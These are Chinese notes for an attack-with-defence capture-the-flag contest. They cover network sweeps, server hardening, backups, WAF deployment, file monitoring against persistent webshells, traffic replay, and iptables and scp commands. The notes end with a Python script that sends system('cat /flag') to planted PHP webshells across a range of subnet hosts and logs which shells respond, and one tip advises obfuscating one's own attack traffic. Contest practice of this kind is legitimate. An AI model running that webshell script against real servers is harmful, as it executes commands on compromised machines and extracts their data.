扫ip  
nmap –sn 192.168.71.0/24  
  
```bash
```
1.先备份服务器  
2.修改ssh密码  
3.dump源码  
4.查找是否有一句话木马  
5.使用 `find / -name *flag*` 或 `grep -rn "flag" *` 类似的语句可以快速发现 flag 所在的地方，方便后续拿分。  
6.bash  
```bash
# ban IP
iptables -I INPUT -s xxx.xxx.xxx.xxx -j DROP
# 解封
iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP
# 查看当前IP规则表
iptables -list

# scp 命令上传下载
# 下载 scp 
scp -P port username@servername:/path/filename /tmp/local_destination
# 上传 scp
scp /path/local_filename -P port username@servername:/path

# 从服务器下载整个目录
scp -P port -r username@servername:remote_dir/ /tmp/local_dir 
# 例如：
scp -P port -r codinglog@192.168.0.101 /home/kimi/test  /tmp/local_dir

```
  
防守策略：  
1. 重中之重：备份网站源码和数据库。这个作用有二，一是以防自己魔改网站源码或数据库后无法恢复，二是裁判一般会定时 Check 服务是否正常，如果不正常会进行扣分，因此备份也可以防对手入侵主机删源码后快速恢复服务。  
  
2. 系统安全性检查。就是不该开的端口 3306 有没有开启、有没有限制 SSH 登陆、SSH密码 修改、MySQL 是否为默认密码等等，这里可以用脚本刷一遍。  
  
3. 部署 WAF。用自己提前准备好的 WAF，使用脚本进行快速部署，但是要注意验证会不会部署完后服务不可用。  
  
4. 修改权限。比如说 MySQL 用户读表权限，上传目录是否可执行的权限等等。  
  
5. 部署文件监控脚本。监控可读写权限的目录是否新增、删除文件并及时提醒。这里说下，如果被种了不死马的话通常有以下几种克制方法：  
  
强行 kill 掉进程后重启服务  
  
建立一个和不死马相同名字的文件或者目录  
  
写脚本不断删除文件  
  
不断写入一个和不死马同名的文件  
  
6. 部署流量监控脚本或开启服务器日志记录。目的主要是为了进行流量回放，看其它大佬如何用我们没发现的漏洞来打我们的机子，抓取到之后把看不懂的流量直接回放到别的机子去，这里还得提到，我们自己在攻击的时候，也要试着混淆一下自己的攻击流量，不能轻易被别人利用。  
  
  
一句话木马批量利用脚本：  
```Python
#coding=utf-8
import requests
url_head="http://xxx.xx.xxx."    #网段
url=""
shell_addr="/Upload/index.php"
passwd="xxxxx"                    #木马密码
port="80"
payload =  {passwd: 'system(\'cat /flag\');'}

webshelllist=open("webshelllist.txt","w")
flag=open("firstround_flag.txt","w")

for i in range(30,61):
    url=url_head+str(i)+":"+port+shell_addr
    try:
        res=requests.post(url,payload,timeout=1)
        if res.status_code == requests.codes.ok:
            result = url+" connect shell sucess,flag is "+res.text
            print result
            print >>flag,result
            print >>webshelllist,url+","+passwd
        else:
            print "shell 404"
    except:
        print url+" connect shell fail"

webshelllist.close()
flag.close()
```
  
  
  
